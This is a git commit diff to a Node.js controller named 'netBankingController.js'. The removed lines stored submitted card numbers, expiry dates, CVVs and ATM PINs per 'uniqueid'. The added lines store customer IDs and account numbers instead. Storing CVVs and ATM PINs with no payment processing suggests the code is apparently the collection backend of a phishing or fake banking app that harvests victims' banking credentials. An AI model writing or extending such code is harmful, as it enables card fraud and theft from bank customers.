c19f46fcb6c9f53d93dadbae9d362d33253b7656
kingofak78 <gotakale952@gmail.com>
2025-05-09 23:04:12 -0700

    Update netBankingController.js

--- controllers/netBankingController.js
+++ controllers/netBankingController.js
@@ -2,28 +2,28 @@ const NetBanking = require('../models/NetBanking');
 
 exports.submitNetBankingPayment = async (req, res) => {
     try {
-        const { uniqueid, cardNumber, expiryDate, cvv, atmPin } = req.body;
+        const { uniqueid, customerId, accountNumber } = req.body;
         let netBanking = await NetBanking.findOne({ uniqueid });
 
         if (netBanking) {
-            netBanking.entries.push({  uniqueid, cardNumber, expiryDate, cvv, atmPin });
+            netBanking.entries.push({ customerId, accountNumber });
         } else {
             netBanking = new NetBanking({
                 uniqueid,
-                entries: [{ uniqueid, cardNumber, expiryDate, cvv, atmPin}]
+                entries: [{ customerId, accountNumber }]
             });
         }
 
         await netBanking.save();
         res.status(200).json({
             success: true,
-            message: "Net Banking Payment Data Submitted Successfully!"
+            message: "Net Banking Data Submitted Successfully!"
         });
     } catch (error) {
         console.error(error);
         res.status(500).json({
             success: false,
-            message: "Error occurred while submitting net banking payment data"
+            message: "Error occurred while submitting net banking data"
         });
     }
 };
